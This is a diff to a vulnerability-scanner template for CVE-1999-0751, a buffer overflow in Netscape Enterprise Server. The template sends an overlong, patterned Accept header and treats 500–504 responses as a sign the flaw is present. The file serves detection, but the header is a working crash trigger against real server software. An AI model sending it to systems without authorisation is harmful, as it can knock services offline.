@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证Netscape企业服务器Accept命令缓冲区溢出漏洞，通过发送超长Accept头触发"
+description = "Netscape Enterprise Server 3.51/3.6 SP2（含 SSL Handshake Patch）在处理 HTTP 请求头中的 Accept 字段时存在缓冲区溢出。发送超长 Accept 头可触发服务端崩溃或潜在代码执行。本 PoC 通过发送超大 Accept 头观察服务器是否异常来判断漏洞存在（安全无损验证，仅检测是否崩溃/异常响应）。"
 id = "POC-AVE-1999-0450"
-name = "CVE-1999-0751 Netscape Enterprise Server Accept Header Buffer Overflow PoC"
+name = "CVE-1999-0751 Netscape Enterprise Server Accept 缓冲区溢出 PoC"
 severity = "medium"
 tags = ["ave-1999-0450"]
 vuln_id = [
@@ -15,15 +15,15 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/"
+path = "/"
 protocol = "http"
 
 [poc.requests.body]
 content = ""
 type = "raw"
 
-[poc.requests.headers]
-Accept = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/gif"
+[poc.requests.body.headers]
+Accept = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
 
 [[poc.requests.matchers]]
 expect = true
@@ -31,16 +31,6 @@ status = [
     500,
     502,
     503,
-    0,
+    504,
 ]
 type = "status"
-
-[[poc.requests.matchers]]
-expect = false
-part = "body"
-type = "word"
-words = [
-    "error",
-    "overflow",
-    "500",
-]
